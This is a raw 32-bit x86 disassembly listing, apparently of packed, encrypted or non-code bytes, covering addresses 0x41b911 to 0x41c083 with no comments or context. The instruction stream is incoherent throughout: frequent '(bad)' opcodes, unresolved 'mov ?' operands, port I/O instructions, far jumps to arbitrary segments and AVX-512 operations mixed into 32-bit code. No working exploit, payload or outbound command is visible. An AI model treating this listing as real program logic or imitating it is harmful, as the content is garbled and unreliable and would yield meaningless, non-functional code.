  41b911:	dec    esp
  41b912:	xchg   DWORD PTR [ecx-0x617e5e49],esp
  41b918:	add    ebp,eax
  41b91a:	neg    BYTE PTR [ecx-0x7e]
  41b91d:	popf   
  41b91e:	or     DWORD PTR [ebx],ecx
  41b920:	fistp  DWORD PTR [ebx-0x5d45dada]
  41b926:	nop
  41b927:	jle    0x41b8fc
  41b929:	cwde   
  41b92a:	sbb    BYTE PTR [edx+0x7396a036],al
  41b930:	vcvtps2pd ymm1,XMMWORD PTR [ebx-0x7d]
  41b935:	jb     0x41b93d
  41b937:	lea    edi,[ebp+0x250cd706]
  41b93d:	pusha  
  41b93e:	ins    DWORD PTR es:[edi],dx
  41b93f:	(bad)  
  41b940:	mov    eax,0x35b13fa8
  41b945:	(bad)  
  41b946:	sub    DWORD PTR [esi],ecx
  41b948:	inc    edx
  41b949:	imul   esp,eax,0xd3ec7978
  41b94f:	cmp    ch,dh
  41b951:	idiv   BYTE PTR [ebx+0x569d423]
  41b957:	out    0x73,al
  41b959:	fcom   QWORD PTR [ebp+0x7e]
  41b95c:	ins    DWORD PTR es:[edi],dx
  41b95d:	xchg   edi,eax
  41b95e:	xchg   ecx,eax
  41b95f:	loop   0x41b992
  41b961:	test   eax,0x50187f6e
  41b966:	dec    ecx
  41b967:	dec    eax
  41b968:	mov    DWORD PTR [ecx+0x6ba1afed],ecx
  41b96e:	sti    
  41b96f:	call   0xda637ffc
  41b974:	cmp    BYTE PTR [eax-0x69],cl
  41b977:	pop    esp
  41b978:	push   ecx
  41b979:	xor    dl,BYTE PTR cs:[edi+0x3c32d4fc]
  41b980:	and    BYTE PTR [ecx+0x37b4ceee],dh
  41b986:	xor    eax,0xe54f7011
  41b98b:	in     al,0xc8
  41b98d:	jno    0x41b93e
  41b98f:	jecxz  0x41b98c
  41b991:	dec    eax
  41b992:	bound  edi,QWORD PTR ds:[eax-0x49]
  41b996:	pop    eax
  41b997:	cs sbb dl,cl
  41b99a:	xchg   edx,eax
  41b99b:	popa   
  41b99c:	push   ss
  41b99d:	es mov ebx,0x1697794a
  41b9a3:	inc    eax
  41b9a4:	adc    ecx,DWORD PTR [ecx]
  41b9a6:	fsubr  st,st(6)
  41b9a8:	nop
  41b9a9:	sbb    eax,0x15ba9e87
  41b9ae:	inc    ebx
  41b9af:	push   esi
  41b9b0:	mov    eax,0x37950b2a
  41b9b5:	scas   al,BYTE PTR es:[edi]
  41b9b6:	or     DWORD PTR [edx-0x5fe0f8a6],ebp
  41b9bc:	mov    ds:0xeee122e5,eax
  41b9c1:	in     eax,0x5f
  41b9c3:	dec    esp
  41b9c4:	ja     0x41b94c
  41b9c6:	mov    gs,WORD PTR [esi-0x4d]
  41b9c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9cb:	hlt    
  41b9cc:	not    DWORD PTR [edx-0x1f]
  41b9cf:	jl     0x41ba09
  41b9d1:	add    eax,0xc2e065f4
  41b9d6:	stc    
  41b9d7:	ins    BYTE PTR es:[edi],dx
  41b9d8:	cmp    esi,DWORD PTR [edi+0x2819a352]
  41b9de:	xchg   esi,eax
  41b9df:	popf   
  41b9e0:	pop    edi
  41b9e1:	jg     0x41b9e5
  41b9e3:	pop    ebp
  41b9e4:	out    0xca,eax
  41b9e6:	pusha  
  41b9e7:	ins    DWORD PTR es:[edi],dx
  41b9e8:	vpermilpd zmm1{k4}{z},zmm5,QWORD PTR es:[esp+edx*4+0x14f06f60]{1to8}
  41b9f4:	enter  0x6989,0xd9
  41b9f8:	test   DWORD PTR [esi],edi
  41b9fa:	shr    ch,cl
  41b9fc:	pop    esi
  41b9fd:	and    BYTE PTR [eax+0x66],ch
  41ba00:	stos   DWORD PTR es:[edi],eax
  41ba01:	call   0xeb76:0x99c10986
  41ba08:	pusha  
  41ba09:	adc    BYTE PTR [edx+0x501ead2d],al
  41ba0f:	in     al,dx
  41ba10:	jb     0x41ba24
  41ba12:	jae    0x41b9d0
  41ba14:	out    0x13,eax
  41ba16:	repnz retf 0x6eb2
  41ba1a:	lea    ecx,[esp+eiz*8]
  41ba1d:	xor    BYTE PTR [ebx-0x1ba5c529],ch
  41ba23:	push   0x10
  41ba25:	jno    0x41ba1a
  41ba27:	bound  eax,QWORD PTR [edi-0x5bd6fb4e]
  41ba2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba2e:	mov    DWORD PTR [ebx-0x16],0xed04034c
  41ba35:	dec    eax
  41ba36:	adc    bh,BYTE PTR [ecx-0x64]
  41ba39:	jmp    0xe9b9:0x87c3cee1
  41ba40:	cmp    BYTE PTR [eax],bh
  41ba42:	and    ecx,DWORD PTR [esi+ecx*8+0x46]
  41ba46:	cdq    
  41ba47:	xor    cl,BYTE PTR [ecx]
  41ba49:	adc    ch,BYTE PTR [ecx-0x4c3d31f4]
  41ba4f:	push   0xffffff88
  41ba51:	xlat   BYTE PTR ds:[ebx]
  41ba52:	hlt    
  41ba53:	arpl   WORD PTR fs:[esi+0x5],bp
  41ba57:	mov    edx,0xe51aa688
  41ba5c:	add    edi,ebp
  41ba5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba5f:	fcom   DWORD PTR [edx-0x4aca0815]
  41ba65:	das    
  41ba66:	push   ecx
  41ba67:	retf   
  41ba68:	aaa    
  41ba69:	mov    ecx,0xc7e40f70
  41ba6e:	jge    0x41ba18
  41ba70:	mov    al,ds:0xc7daa28d
  41ba75:	out    0xa0,eax
  41ba77:	jae    0x41baec
  41ba79:	and    BYTE PTR [ebx+0x2e3c5295],cl
  41ba7f:	mov    esp,DWORD PTR [ecx]
  41ba81:	data16 repnz or al,0xd3
  41ba85:	add    DWORD PTR [edi-0x21],ecx
  41ba88:	neg    DWORD PTR [eax+0x77c87c20]
  41ba8e:	in     al,dx
  41ba8f:	mov    eax,0x7c2c51
  41ba94:	sub    al,bh
  41ba96:	add    DWORD PTR [edx-0x2d8395ec],ebp
  41ba9c:	hlt    
  41ba9d:	xor    al,dl
  41ba9f:	sti    
  41baa0:	mov    cl,0xb9
  41baa2:	cmp    al,0x8a
  41baa4:	addr16 shl edx,0x1b
  41baa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baaa:	jae    0x41ba92
  41baac:	retf   
  41baad:	jp     0x41ba83
  41baaf:	fcmovnbe st,st(6)
  41bab1:	cmp    cl,BYTE PTR [ebx-0x6d37ab1b]
  41bab7:	add    al,0xae
  41bab9:	ss or  eax,0xa1da7910
  41babf:	cdq    
  41bac0:	mov    cl,0x6d
  41bac2:	dec    ebx
  41bac3:	gs dec edi
  41bac5:	iret   
  41bac6:	inc    edi
  41bac7:	lods   eax,DWORD PTR ds:[esi]
  41bac8:	or     eax,DWORD PTR [esi]
  41baca:	add    dh,BYTE PTR [ebp+0x3dc2ca6d]
  41bad0:	push   0x42d8455
  41bad5:	out    0x87,al
  41bad7:	stos   DWORD PTR es:[edi],eax
  41bad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bad9:	sahf   
  41bada:	mov    eax,ds:0x82bb89ab
  41badf:	sbb    eax,esi
  41bae1:	or     bh,BYTE PTR [ecx]
  41bae3:	xor    eax,0x9c92f245
  41bae8:	test   eax,0xeaffe004
  41baed:	jb     0x41bb31
  41baef:	jne    0x41bb0e
  41baf1:	out    dx,al
  41baf2:	sub    dh,BYTE PTR [edi]
  41baf4:	mov    ?,ebp
  41baf6:	push   ebx
  41baf7:	and    eax,0xe9c5602e
  41bafc:	inc    edx
  41bafd:	repz clc 
  41baff:	push   ss
  41bb00:	inc    edx
  41bb01:	out    0x3b,eax
  41bb03:	sbb    al,0x24
  41bb05:	jnp    0x41ba91
  41bb07:	pop    ecx
  41bb08:	sti    
  41bb09:	jle    0x41bb5f
  41bb0b:	xchg   edx,eax
  41bb0c:	pop    esp
  41bb0d:	cmp    cl,bl
  41bb0f:	cmp    DWORD PTR [edi+0x46],0xfffffffc
  41bb13:	push   edi
  41bb14:	pop    ecx
  41bb15:	add    bl,BYTE PTR [ebx]
  41bb17:	leave  
  41bb18:	sar    BYTE PTR [eax-0x53],0xc1
  41bb1c:	sbb    DWORD PTR [ecx+0x5276b90c],esp
  41bb22:	push   ecx
  41bb23:	sbb    DWORD PTR [ecx],esp
  41bb25:	push   0x3d22ab9b
  41bb2a:	xor    bl,BYTE PTR [edx+0x17d65ea1]
  41bb30:	call   0xe3b1936f
  41bb35:	lods   eax,DWORD PTR ds:[esi]
  41bb36:	jle    0x41bac3
  41bb38:	fwait
  41bb39:	mov    ebp,0x5e6384f7
  41bb3e:	out    0x44,al
  41bb40:	pop    eax
  41bb41:	dec    edi
  41bb42:	lahf   
  41bb43:	mov    ah,0xea
  41bb45:	call   0x3a2b2ac
  41bb4a:	mov    bh,0x2b
  41bb4c:	rcl    BYTE PTR [edx+0x21],0xa1
  41bb50:	fwait
  41bb51:	inc    ecx
  41bb52:	mov    ebp,0x79470e38
  41bb57:	xor    al,BYTE PTR [edi-0x6b3c187f]
  41bb5d:	ret    0x204f
  41bb60:	add    al,BYTE PTR [esi-0x133b86e7]
  41bb66:	pop    esp
  41bb67:	sbb    eax,0x251d411e
  41bb6c:	xchg   BYTE PTR [esi-0x39],bh
  41bb6f:	cmp    ch,BYTE PTR [esi]
  41bb71:	les    eax,FWORD PTR ds:0x7322268b
  41bb77:	aad    0x28
  41bb79:	(bad)  
  41bb7a:	mov    edi,0x2ca5c3e3
  41bb7f:	aam    0x44
  41bb81:	xor    BYTE PTR [ecx+0x70],al
  41bb84:	sbb    al,0x18
  41bb86:	icebp  
  41bb87:	(bad)  
  41bb88:	nop
  41bb89:	aad    0x1
  41bb8b:	add    al,0x2e
  41bb8d:	test   BYTE PTR [ebx-0x50e4e00d],al
  41bb93:	dec    ebx
  41bb94:	test   DWORD PTR [ebp-0x1f],0x2da4b591
  41bb9b:	(bad)  
  41bb9d:	jne    0x41bbc3
  41bb9f:	mov    ah,0x9a
  41bba1:	add    BYTE PTR [esi+0x665edc52],cl
  41bba7:	cmp    DWORD PTR [ecx],esi
  41bba9:	xchg   edi,eax
  41bbaa:	(bad)
  41bbae:	loopne 0x41bbe9
  41bbb0:	sub    eax,0x975719ba
  41bbb5:	mov    ds:0x192c0bad,al
  41bbba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbbc:	lea    esp,[eax-0x5d5f84cb]
  41bbc2:	outs   dx,BYTE PTR ds:[esi]
  41bbc3:	mov    al,0x68
  41bbc5:	das    
  41bbc6:	mov    dl,0x75
  41bbc8:	inc    ebp
  41bbc9:	in     al,0xea
  41bbcb:	sbb    ebx,esi
  41bbcd:	dec    edx
  41bbce:	in     al,dx
  41bbcf:	dec    eax
  41bbd0:	pop    esi
  41bbd1:	lds    ebx,FWORD PTR [ebx+0x778d4806]
  41bbd7:	jmp    0xabd9:0x1e1962d8
  41bbde:	mov    ch,0xe9
  41bbe0:	ficom  WORD PTR [edi+0x433aa6dc]
  41bbe6:	int    0x52
  41bbe8:	or     BYTE PTR [edx],al
  41bbea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbeb:	jg     0x41bc09
  41bbed:	(bad)  
  41bbee:	push   esi
  41bbef:	in     eax,dx
  41bbf0:	daa    
  41bbf1:	cmp    BYTE PTR [esi],0xd0
  41bbf4:	or     esp,esp
  41bbf6:	cdq    
  41bbf7:	test   BYTE PTR [ebp+0x5495eb5a],0x8d
  41bbfe:	js     0x41bc08
  41bc00:	(bad)  [esi+0x23]
  41bc03:	(bad)
  41bc06:	and    DWORD PTR [eax],esi
  41bc08:	lahf   
  41bc09:	or     al,0x97
  41bc0b:	inc    ebx
  41bc0c:	hlt    
  41bc0d:	mov    ebx,0xd11cdaa3
  41bc12:	and    BYTE PTR ds:0x2e2fae65,ch
  41bc18:	pop    eax
  41bc19:	retf   
  41bc1a:	int3   
  41bc1b:	jecxz  0x41bbdf
  41bc1d:	dec    eax
  41bc1e:	xchg   edx,eax
  41bc1f:	je     0x41bbe2
  41bc21:	sub    ah,BYTE PTR [edi+edi*2+0xe]
  41bc25:	lock sub al,0x43
  41bc28:	daa    
  41bc29:	xor    eax,0xfc206365
  41bc2e:	data16 mov ch,cl
  41bc31:	stos   DWORD PTR es:[edi],eax
  41bc32:	or     ah,cl
  41bc34:	les    edi,FWORD PTR [esi-0x1]
  41bc37:	sbb    BYTE PTR [ebp+0x6],ah
  41bc3a:	jns    0x41bc09
  41bc3c:	xchg   ebp,eax
  41bc3d:	jmp    0xbdee:0xb56744fd
  41bc44:	xor    dh,BYTE PTR gs:[eax-0x33a8f8fb]
  41bc4b:	(bad)  
  41bc4d:	jecxz  0x41bbeb
  41bc4f:	jg     0x41bca3
  41bc51:	pop    ecx
  41bc52:	jbe    0x41bc62
  41bc54:	jmp    0x1f657772
  41bc59:	push   edi
  41bc5a:	sub    dh,BYTE PTR [edi+0x12de53fe]
  41bc60:	xor    eax,0x329d3e0a
  41bc65:	clc    
  41bc66:	xchg   ebx,eax
  41bc67:	sub    BYTE PTR [esi+0x73ad5b07],ch
  41bc6d:	sbb    al,0xd3
  41bc6f:	(bad)  
  41bc70:	sti    
  41bc71:	jae    0x41bbfd
  41bc73:	xchg   edi,eax
  41bc74:	sub    al,0xe8
  41bc76:	in     eax,0xba
  41bc78:	ins    BYTE PTR es:[edi],dx
  41bc79:	mov    edx,0x7cf4e771
  41bc7e:	fidiv  DWORD PTR [ecx-0x50952fdf]
  41bc84:	mov    WORD PTR [ecx-0x3c],gs
  41bc87:	jl     0x41bc75
  41bc89:	add    al,0x3f
  41bc8b:	fstp   DWORD PTR [eax+ebp*4]
  41bc8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc8f:	aad    0x8d
  41bc91:	push   esp
  41bc92:	jmp    0xff7c75a5
  41bc97:	pop    edx
  41bc98:	repz sub al,0xaa
  41bc9b:	and    eax,0xb752a34e
  41bca0:	aas    
  41bca1:	test   eax,0xc18d1e8
  41bca6:	dec    ebx
  41bca7:	fnstenv [esi+0x7]
  41bcaa:	sbb    eax,DWORD PTR [esi+0x8]
  41bcad:	mov    ah,0xf7
  41bcaf:	retf   
  41bcb0:	cli    
  41bcb1:	inc    edx
  41bcb2:	idiv   BYTE PTR [eax-0x19d7dd63]
  41bcb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcb9:	test   DWORD PTR [ebx-0x354abbc2],ebp
  41bcbf:	scas   eax,DWORD PTR es:[edi]
  41bcc0:	pop    ss
  41bcc1:	adc    BYTE PTR [esi-0x4dbe370d],ah
  41bcc7:	sub    eax,0xb97270d7
  41bccc:	mov    bh,0x6
  41bcce:	sbb    eax,0x9a80924e
  41bcd3:	adc    DWORD PTR [ecx+0x54],edx
  41bcd6:	xchg   ebp,eax
  41bcd7:	out    0x68,al
  41bcd9:	ret    
  41bcda:	push   ss
  41bcdb:	xchg   esp,eax
  41bcdc:	push   es
  41bcdd:	mov    al,ds:0x30647d66
  41bce2:	sub    esp,esp
  41bce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bce5:	aad    0xa2
  41bce7:	addr16 xor al,0x8a
  41bcea:	std    
  41bceb:	sub    eax,0x3cd933f7
  41bcf0:	loope  0x41bcbc
  41bcf2:	cmp    DWORD PTR ds:0x89bf97c8,0x745adeb8
  41bcfc:	repnz in eax,dx
  41bcfe:	mov    ds:0x2211cdfe,eax
  41bd03:	mov    ebp,0x30282e41
  41bd08:	shl    BYTE PTR [edi-0x67c3944a],cl
  41bd0e:	adc    DWORD PTR [esi+0xb855b93],edx
  41bd14:	mov    dl,0xa7
  41bd16:	jbe    0x41bd5f
  41bd18:	pop    ds
  41bd19:	adc    eax,0x8b5cdc89
  41bd1e:	mov    WORD PTR [eax-0x66],gs
  41bd21:	rcr    ch,0x4f
  41bd24:	sti    
  41bd25:	shr    bh,cl
  41bd27:	stos   BYTE PTR es:[edi],al
  41bd28:	lds    esp,FWORD PTR [eax*2-0x4a64989a]
  41bd2f:	push   esi
  41bd30:	(bad)  
  41bd31:	sub    al,0xea
  41bd33:	or     esi,DWORD PTR [ecx]
  41bd35:	or     eax,eax
  41bd37:	jmp    0x41bce6
  41bd39:	pop    esi
  41bd3a:	pop    eax
  41bd3b:	fmul   st,st(4)
  41bd3d:	sbb    dh,BYTE PTR [edx]
  41bd3f:	fidiv  DWORD PTR [edx-0x3c]
  41bd42:	ret    0x48e9
  41bd45:	pop    ss
  41bd46:	lods   al,BYTE PTR ds:[esi]
  41bd47:	mov    eax,ds:0xce3941fc
  41bd4c:	fdiv   st,st(0)
  41bd4e:	js     0x41bceb
  41bd50:	nop
  41bd51:	sub    al,0xce
  41bd53:	push   esp
  41bd54:	fcmove st,st(3)
  41bd56:	stc    
  41bd57:	xor    eax,0x736c199
  41bd5c:	popf   
  41bd5d:	pop    ebp
  41bd5e:	fdivrp st(6),st
  41bd60:	ds mov ecx,0x175b807c
  41bd66:	mov    esp,0xe9e545a
  41bd6b:	dec    ebx
  41bd6c:	xor    ch,BYTE PTR [esi+0xf33534c]
  41bd72:	(bad)  
  41bd74:	retf   
  41bd75:	std    
  41bd76:	fnstsw WORD PTR [edi-0x10ac7f1c]
  41bd7c:	test   al,0xf1
  41bd7e:	or     BYTE PTR [ecx],ah
  41bd80:	lods   eax,DWORD PTR ds:[esi]
  41bd81:	aad    0xb8
  41bd83:	mov    eax,DWORD PTR [edi-0x45ed9eb7]
  41bd89:	cs stos BYTE PTR es:[edi],al
  41bd8b:	jo     0x41bd24
  41bd8d:	(bad)  
  41bd8f:	xchg   ecx,eax
  41bd90:	scas   al,BYTE PTR es:[edi]
  41bd91:	inc    ecx
  41bd92:	mov    ds:0x6fe2d0f0,eax
  41bd97:	into   
  41bd98:	int    0x9c
  41bd9a:	push   ss
  41bd9b:	sbb    DWORD PTR [ebx+eiz*2+0x74],0x7d245e16
  41bda3:	jae    0x41bd9d
  41bda5:	push   eax
  41bda6:	std    
  41bda7:	sbb    BYTE PTR [eax+0x4c4b0ede],dh
  41bdad:	loope  0x41be1c
  41bdaf:	out    dx,eax
  41bdb0:	mov    ecx,0xe84c4e3f
  41bdb5:	fild   DWORD PTR [ecx+0xd]
  41bdb8:	inc    edi
  41bdb9:	mov    WORD PTR [ebp-0x7e],gs
  41bdbc:	fidivr WORD PTR [edi-0x65]
  41bdbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc0:	jbe    0x41bdd4
  41bdc2:	ins    DWORD PTR es:[edi],dx
  41bdc3:	jge    0x41be36
  41bdc5:	xor    esp,DWORD PTR [edx]
  41bdc7:	xchg   ebp,eax
  41bdc8:	add    eax,0x70b2c4e4
  41bdcd:	sar    DWORD PTR [edx-0x46],1
  41bdd0:	push   edi
  41bdd1:	adc    eax,0xb2e9f8d9
  41bdd6:	push   edx
  41bdd7:	aaa    
  41bdd8:	ds (bad) 
  41bdda:	out    dx,al
  41bddb:	mov    ebx,0xc859cb8d
  41bde0:	or     eax,0xd9e2a525
  41bde5:	(bad)
  41bde8:	nop
  41bde9:	shl    BYTE PTR [ecx*8-0x156d8438],cl
  41bdf0:	add    ebp,DWORD PTR [edx+eiz*1+0x4e]
  41bdf4:	jmp    0xbba3:0x4a81bc44
  41bdfb:	sub    bh,al
  41bdfd:	bound  ecx,QWORD PTR [esp+edx*2]
  41be00:	xor    ebx,DWORD PTR [edx+0x4c]
  41be03:	adc    al,0x98
  41be05:	(bad)  
  41be07:	shl    BYTE PTR [esi-0x2e],0xbf
  41be0b:	jp     0x41be17
  41be0d:	loop   0x41be2b
  41be0f:	scas   eax,DWORD PTR es:[edi]
  41be10:	cwde   
  41be11:	jns    0x41be5a
  41be13:	ret    
  41be14:	dec    esp
  41be15:	add    al,0x86
  41be17:	daa    
  41be18:	pop    ecx
  41be19:	cdq    
  41be1a:	add    ah,0x0
  41be1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be1e:	dec    ebp
  41be1f:	aas    
  41be20:	cmp    eax,0x6eef6fc5
  41be25:	(bad)  
  41be26:	(bad)  [ecx]
  41be28:	call   0x596366b2
  41be2d:	test   BYTE PTR [ebp-0x129b44f9],dl
  41be33:	cmp    BYTE PTR [esp+ecx*1+0x35],dh
  41be37:	repnz mov al,0x52
  41be3b:	cmp    ebp,DWORD PTR [ebx-0x2f81ba62]
  41be41:	or     DWORD PTR [ebp+0x4a],esi
  41be44:	sti    
  41be45:	inc    edx
  41be46:	sbb    eax,0xa02f9ee1
  41be4b:	jmp    0xf2e0:0x5ceacc8c
  41be52:	lods   al,BYTE PTR ds:[esi]
  41be53:	cmc    
  41be54:	and    eax,0xa4a4e91e
  41be5a:	jmp    0x41be8e
  41be5c:	sub    ecx,eax
  41be5e:	shl    DWORD PTR cs:[ecx-0x11923f12],1
  41be65:	mul    BYTE PTR [ebx]
  41be67:	sub    eax,0x4e08b37f
  41be6c:	dec    edi
  41be6d:	dec    edx
  41be6e:	mov    DWORD PTR [ebx],ecx
  41be70:	ss inc ebp
  41be72:	xor    eax,0x39e58d6a
  41be77:	rcr    DWORD PTR [eax-0x46],cl
  41be7a:	fmul   DWORD PTR [ebx+0x5b77a6b2]
  41be80:	mov    ds:0x12218ed9,al
  41be85:	aad    0x54
  41be87:	outs   dx,BYTE PTR ds:[esi]
  41be88:	fld    DWORD PTR [eax+eax*4+0x5f]
  41be8c:	dec    esi
  41be8d:	mov    ah,0x36
  41be8f:	dec    esi
  41be90:	pop    esp
  41be91:	lods   eax,DWORD PTR ds:[esi]
  41be92:	nop
  41be93:	and    dl,BYTE PTR [edi-0x2e42dd5c]
  41be99:	das    
  41be9a:	add    eax,0xe4000167
  41be9f:	xchg   edi,eax
  41bea0:	dec    eax
  41bea1:	std    
  41bea2:	cld    
  41bea3:	ins    DWORD PTR es:[edi],dx
  41bea4:	mov    ecx,0xe326b1c0
  41bea9:	xchg   ecx,eax
  41beaa:	daa    
  41beab:	daa    
  41beac:	loop   0x41beeb
  41beae:	xor    DWORD PTR [ebx+eiz*2],esi
  41beb1:	adc    al,0x55
  41beb3:	pop    esi
  41beb4:	repnz in al,dx
  41beb6:	mov    esi,0xc876a939
  41bebb:	jno    0x41beba
  41bebd:	fwait
  41bebe:	or     al,0xcc
  41bec0:	out    0x7,eax
  41bec2:	fcom   DWORD PTR [esi+0x35fcf37a]
  41bec8:	cwde   
  41bec9:	int3   
  41beca:	xor    DWORD PTR [ecx],0xffffffe5
  41becd:	inc    esi
  41bece:	daa    
  41becf:	inc    ecx
  41bed0:	xor    al,0xb0
  41bed2:	gs sti 
  41bed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bed5:	retf   
  41bed6:	ret    0x8b8f
  41bed9:	data16 outs dx,BYTE PTR ds:[esi]
  41bedb:	fimul  WORD PTR [eax+0x63]
  41bede:	pop    ebp
  41bedf:	pop    edx
  41bee0:	fdivrp st(3),st
  41bee2:	xor    ecx,DWORD PTR [edx+0x52]
  41bee5:	ror    BYTE PTR [ebx-0x67],0xa1
  41bee9:	xor    ebx,DWORD PTR [ebp+0x56]
  41beec:	bnd jno 0x41beef
  41beef:	jl     0x41bf31
  41bef1:	push   ds
  41bef2:	loopne 0x41bed0
  41bef4:	sbb    DWORD PTR ds:0x152b7375,eax
  41befa:	cld    
  41befb:	pop    es
  41befc:	repz lea ebx,[ebx+0x755500c5]
  41bf03:	in     eax,dx
  41bf04:	jmp    0x1359:0xb3f400cf
  41bf0b:	test   eax,0x4fa18cd1
  41bf10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf11:	jb     0x41bf32
  41bf13:	and    BYTE PTR [esi],ah
  41bf15:	aas    
  41bf16:	jmp    0xbb517057
  41bf1b:	stos   BYTE PTR es:[edi],al
  41bf1c:	xchg   esp,eax
  41bf1d:	push   ebp
  41bf1e:	pop    ecx
  41bf1f:	fs sbb eax,0x92aebe5d
  41bf25:	push   esp
  41bf26:	ror    BYTE PTR [eax+0x44],1
  41bf29:	jmp    0xdb7f:0x84a579a2
  41bf30:	pushf  
  41bf31:	dec    ecx
  41bf32:	sar    ch,cl
  41bf34:	inc    eax
  41bf35:	mov    eax,0x392818ec
  41bf3a:	cs js  0x41bf5b
  41bf3d:	out    0xea,eax
  41bf3f:	mov    esp,0xa9a393e0
  41bf44:	and    BYTE PTR [ebx+0xcec1ecc],ah
  41bf4a:	(bad)
  41bf4d:	jle    0x41bfb5
  41bf4f:	cmp    BYTE PTR [edx-0x7c],cl
  41bf52:	jecxz  0x41bf05
  41bf54:	cmp    eax,edx
  41bf56:	inc    ebx
  41bf57:	mov    edi,0x561624cf
  41bf5c:	push   esp
  41bf5d:	popf   
  41bf5e:	jns    0x41bf22
  41bf60:	sub    DWORD PTR [ecx],eax
  41bf62:	jbe    0x41bf31
  41bf64:	stos   DWORD PTR es:[edi],eax
  41bf65:	jae    0x41bf9a
  41bf67:	fcmovnu st,st(4)
  41bf69:	cmp    edx,DWORD PTR [ecx-0x5a1e3a75]
  41bf6f:	pop    es
  41bf70:	stc    
  41bf71:	out    0xe6,al
  41bf73:	xor    BYTE PTR [esi-0x3c1c1899],dh
  41bf79:	mov    ecx,0x6e239715
  41bf7e:	(bad)  
  41bf7f:	scas   al,BYTE PTR es:[edi]
  41bf80:	je     0x41c001
  41bf82:	cli    
  41bf83:	idiv   BYTE PTR [ebx+0x3b]
  41bf86:	xchg   ebp,eax
  41bf87:	(bad)  
  41bf89:	jle    0x41bf60
  41bf8b:	jo     0x41bfec
  41bf8d:	imul   ecx,DWORD PTR [edi+0x3219a5ca],0x77
  41bf94:	mov    ah,0x1f
  41bf96:	cmc    
  41bf97:	or     cl,0x63
  41bf9a:	jle    0x41bf59
  41bf9c:	pusha  
  41bf9d:	adc    ch,dh
  41bf9f:	add    eax,0x14911ba0
  41bfa4:	or     DWORD PTR [ebp+0x176693c],edi
  41bfaa:	enter  0x3ddb,0x1b
  41bfae:	jle    0x41c00f
  41bfb0:	sar    DWORD PTR [esi+0x701474e2],cl
  41bfb6:	pop    ebp
  41bfb7:	cmc    
  41bfb8:	loope  0x41c012
  41bfba:	xor    BYTE PTR [esi-0x4c],0x38
  41bfbe:	(bad)  
  41bfbf:	int    0xe3
  41bfc1:	scas   al,BYTE PTR es:[edi]
  41bfc2:	mov    ds:0x344e4fe8,eax
  41bfc7:	inc    ecx
  41bfc8:	jecxz  0x41bf4f
  41bfca:	push   edx
  41bfcb:	mov    ch,0xd1
  41bfcd:	push   0x39
  41bfcf:	xchg   ebx,eax
  41bfd0:	adc    al,0x6a
  41bfd2:	sub    al,0x8e
  41bfd4:	shl    BYTE PTR [esi],0xc3
  41bfd7:	dec    ecx
  41bfd8:	popa   
  41bfd9:	dec    ebp
  41bfda:	jnp    0x41bf62
  41bfdc:	loopne 0x41bf7b
  41bfde:	iret   
  41bfdf:	neg    BYTE PTR [edi]
  41bfe1:	out    dx,al
  41bfe2:	test   al,0xa8
  41bfe4:	stos   DWORD PTR es:[edi],eax
  41bfe5:	je     0x41c03e
  41bfe7:	pop    edx
  41bfe9:	pop    esi
  41bfea:	call   0x61d3949e
  41bfef:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bff1:	or     eax,0xce0dde23
  41bff6:	sti    
  41bff7:	push   es
  41bff8:	sub    DWORD PTR [eax-0x2b160966],0x8f354b09
  41c002:	jl     0x41bf9f
  41c004:	cmp    dh,BYTE PTR [eax-0x59]
  41c007:	push   eax
  41c008:	mov    ds:0x81e87ade,eax
  41c00d:	add    dh,0x1f
  41c010:	jns    0x41bfa3
  41c012:	pop    eax
  41c013:	push   es
  41c014:	xlat   BYTE PTR ds:[ebx]
  41c015:	shl    BYTE PTR [esi-0x6d8b6d51],0xfe
  41c01c:	in     eax,0xf9
  41c01e:	xlat   BYTE PTR ds:[ebx]
  41c01f:	sbb    al,0x16
  41c021:	adc    al,0x75
  41c023:	adc    edx,DWORD PTR [esi]
  41c025:	push   edx
  41c026:	mov    ?,WORD PTR cs:[esi]
  41c029:	test   BYTE PTR [ebp+0x31a85440],ah
  41c02f:	lahf   
  41c030:	add    ch,dl
  41c032:	add    DWORD PTR [ecx+0x33],ebp
  41c035:	push   eax
  41c036:	cmc    
  41c037:	add    cl,BYTE PTR [ecx+0x5e33a6e2]
  41c03d:	popf   
  41c03e:	inc    edi
  41c03f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c040:	fsubr  st,st(4)
  41c042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c043:	adc    BYTE PTR [edi+0x7312b6a2],al
  41c049:	not    DWORD PTR [edx+0x4c]
  41c04c:	and    DWORD PTR [esi+0x6],eax
  41c04f:	sti    
  41c050:	add    cl,BYTE PTR [edi]
  41c052:	lods   al,BYTE PTR ds:[esi]
  41c053:	sbb    bh,BYTE PTR [ebx+0x5e5efcae]
  41c059:	sahf   
  41c05a:	mov    ebp,0x49b45d34
  41c05f:	(bad)  
  41c060:	cmp    esi,DWORD PTR [edx-0x6d330257]
  41c066:	jnp    0x41c031
  41c068:	xchg   ecx,eax
  41c069:	dec    ebp
  41c06a:	in     eax,0xd
  41c06c:	daa    
  41c06d:	xor    edi,DWORD PTR [ebx+0x6c]
  41c070:	popa   
  41c071:	stos   DWORD PTR es:[edi],eax
  41c072:	mov    ds:0x486b270d,eax
  41c077:	in     al,0xbb
  41c079:	adc    al,0xa4
  41c07b:	sub    eax,0x26aa8958
  41c080:	push   ebp
  41c081:	sub    DWORD PTR [ebx],eax
  41c083:	call   0x34ec4715
